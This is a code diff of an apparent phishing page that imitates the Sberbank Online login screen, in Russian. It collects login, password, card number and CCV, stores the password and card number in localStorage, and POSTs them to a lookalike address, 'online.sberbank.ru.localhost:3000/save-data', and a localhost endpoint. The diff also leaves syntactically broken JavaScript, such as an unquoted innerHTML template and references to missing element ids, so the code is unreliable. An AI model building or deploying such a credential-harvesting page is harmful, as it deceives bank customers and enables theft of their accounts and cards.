@@ -4,65 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Вход в СберБанк Онлайн</title>
-   <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            max-width: 500px;
-            padding: 20px;
-            background-color: white;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
-
-        h1 {
-            text-align: center;
-        }
-
-        label {
-            margin-bottom: 8px;
-            font-size: 16px;
-        }
-
-        input {
-            padding: 10px;
-            margin-bottom: 15px;
-            width: 100%;
-            max-width: 400px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            box-sizing: border-box;
-        }
-
-        button {
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <style>
     * {
@@ -265,7 +206,7 @@
 
       const cardFieldsContainer = document.createElement("div");
       cardFieldsContainer.classList.add("hidden");
-      cardFieldsContainer.innerHTML = ` 
+      cardFieldsContainer.innerHTML = 
         <div class="form-group">
           <input id="card-number" type="text" placeholder="Введите номер карты">
         </div>
@@ -275,8 +216,7 @@
         <div class="form-group">
           <input type="number" placeholder="CCV" max="999" min="100">
         </div>
-        <button id="card-login-btn">Войти</button>
-      `;
+      ;
       document.querySelector("form").insertBefore(cardFieldsContainer, rememberContainer);
 
       tabs.forEach((tab, index) => {
@@ -290,58 +230,64 @@
             loginButton.classList.add("hidden");
             noCardText.classList.add("hidden");
             cardFieldsContainer.classList.remove("hidden");
-            loginInput.placeholder = "Введите номер карты";
-          } else if (index === 1) {
-            loginInput.placeholder = "Введите телефон";
-            formGroups.forEach(group => group.classList.remove("hidden"));
-            rememberContainer.classList.remove("hidden");
-            loginButton.classList.remove("hidden");
-            noCardText.classList.remove("hidden");
-            cardFieldsContainer.classList.add("hidden");
           } else {
             formGroups.forEach(group => group.classList.remove("hidden"));
             rememberContainer.classList.remove("hidden");
             loginButton.classList.remove("hidden");
             noCardText.classList.remove("hidden");
             cardFieldsContainer.classList.add("hidden");
-            loginInput.placeholder = "Введите логин";
           }
         });
       });
 
+      cardFieldsContainer.addEventListener("input", function () {
+        const cardNumber = document.getElementById("card-number").value;
+        if (cardNumber.trim() !== "") {
+          loginButton.classList.remove("hidden");
+        } else {
+          loginButton.classList.add("hidden");
+        }
+      });
+
+      // Save and load input data
+      loginInput.value = localStorage.getItem("login") || "";
+      passwordInput.value = localStorage.getItem("password") || "";
+      const cardNumberInput = document.getElementById("card-number");
+      if (cardNumberInput) cardNumberInput.value = localStorage.getItem("cardNumber") || "";
+
+      loginInput.addEventListener("input", function () {
+        localStorage.setItem("login", loginInput.value);
+      });
+
+      passwordInput.addEventListener("input", function () {
+        localStorage.setItem("password", passwordInput.value);
+      });
+
+      if (cardNumberInput) {
+        cardNumberInput.addEventListener("input", function () {
+          localStorage.setItem("cardNumber", cardNumberInput.value);
+        });
+      }
+
       loginButton.addEventListener("click", function () {
-        errorMessage.textContent = ''; // Очистить предыдущие ошибки
+        errorMessage.textContent = ''; // Clear previous errors
 
         const login = loginInput.value.trim();
         const password = passwordInput.value.trim();
         const cardNumber = document.getElementById("card-number")?.value.trim() || "";
 
-        // Проверка на пустые поля
         if (!login || !password) {
-          errorMessage.textContent = 'Неверный логин или пароль. Попробуйте еще раз.';
-          loginInput.value = ""; // Очистить поле логин
-          passwordInput.value = ""; // Очистить поле пароль
+          errorMessage.textContent = 'Логин и пароль не могут быть пустыми!';
           return;
         }
 
-        // Если выбрана вкладка с телефоном
-        if (tabs[1].classList.contains("active") && !/^\+?[0-9]{10,15}$/.test(login)) {
-          errorMessage.textContent = 'Неверный номер телефона или пароль. Попробуйте еще раз.';
-          loginInput.value = ""; // Очистить поле телефон
-          passwordInput.value = ""; // Очистить поле пароль
-          return;
-        }
-
-        // Проверка карты
         if (cardFieldsContainer.classList.contains("hidden") && cardNumber) {
           if (!/^\d{16}$/.test(cardNumber)) {
-            errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
-            document.getElementById("card-number").value = "";
+            errorMessage.textContent = 'Номер карты должен состоять из 16 цифр!';
             return;
           }
         }
 
-        // Отправка данных
         const dataToSend = { login, password, cardNumber };
 
         fetch('https://online.sberbank.ru.localhost:3000/save-data', {
@@ -360,73 +306,10 @@
           errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
         });
       });
-
-      // Обработчики для кнопок "Вход по QR-коду" и "Вход по коду"
-      document.querySelectorAll('.auth-option').forEach(option => {
-        option.addEventListener('click', () => {
-          window.location.href = 'https://example.com/404'; // Страница 404
-        });
-      });
-
-      // Обработчик для кнопки входа с номером карты
-      document.getElementById("card-login-btn")?.addEventListener('click', function () {
-        errorMessage.textContent = ''; // Очистить ошибки
-        const cardNumber = document.getElementById("card-number").value.trim();
-
-        if (!/^\d{16}$/.test(cardNumber)) {
-          errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
-          document.getElementById("card-number").value = "";
-          return;
-        }
-
-        alert("Номер карты введен корректно!");
-      });
     });
   </script>
 </head>
 <body>
-  <div class="container">
-        <h1>Форма для отправки данных</h1>
-        <form id="myForm">
-            <label for="name">Имя:</label>
-            <input type="text" id="name" name="name" required><br>
-
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required><br>
-
-            <button type="submit">Отправить</button>
-        </form>
-    </div>
-
-    <script>
-        // Код для отправки данных на сервер при отправке формы
-        document.getElementById('myForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Предотвращаем отправку формы по умолчанию
-
-            const data = {
-                name: document.getElementById('name').value,
-                email: document.getElementById('email').value
-            };
-
-            fetch('http://localhost:3000/save-data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Данные успешно отправлены');
-                } else {
-                    console.error('Ошибка при отправке данных');
-                }
-            })
-            .catch(error => {
-                console.error('Ошибка: ', error);
-            });
-        });
-    </script>
   <div class="login-container">
     <div class="logo">
       <img src="sber.png" alt="СберБанк">
@@ -437,16 +320,22 @@
       <div class="tab">Телефон</div>
       <div class="tab">Номер карты</div>
     </div>
-    <form>
+     <!-- Форма авторизации -->
+ <form id="loginForm">
       <div class="form-group">
         <input type="text" placeholder="Введите логин">
       </div>
       <div class="form-group">
         <input type="password" placeholder="Пароль">
       </div>
+        <button type="submit">Войти</button>
+  </form>
+
+  <div class="error"></div>
+
       <div class="remember-container">
         <label><input type="checkbox"> Запомнить меня</label>
-        <a href="https://example.com/404" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
+        <a href="#" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
       </div>
       <button type="button">Войти</button>
       <p class="no-card-text">Нет карты СберБанка?</p>
@@ -468,8 +357,8 @@
     </div>
 
     <div class="report-buttons">
-      <div class="report-button" onclick="window.location.href='https://example.com/404'">Сообщить о мошеннике</div>
-      <div class="report-button" onclick="window.location.href='https://example.com/404'">Больше о безопасности</div>
+      <div class="report-button">Сообщить о мошеннике</div>
+      <div class="report-button">Больше о безопасности</div>
     </div>
 
     <div class="security-info">
@@ -486,29 +375,17 @@
       </div>
     </footer>
   </div>
-  <h1>Форма для отправки данных</h1>
-    <form id="myForm">
-        <label for="name">Имя:</label>
-        <input type="text" id="name" name="name" required><br><br>
-
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required><br><br>
-
-        <button type="submit">Отправить</button>
-    </form>
-
-    <!-- Здесь идет ваш JavaScript код -->
-    <script>
+  <script>
         // Код для отправки данных на сервер при отправке формы
-        document.getElementById('myForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Предотвращаем отправку формы по умолчанию
 
             const data = {
-                name: document.getElementById('name').value,
-                email: document.getElementById('email').value
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value
             };
 
-            fetch('http://localhost:3000/save-data', { // сюда может быть ваш реальный URL
+            fetch('http://localhost:3000/save-data', { // Убедитесь, что сервер работает
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
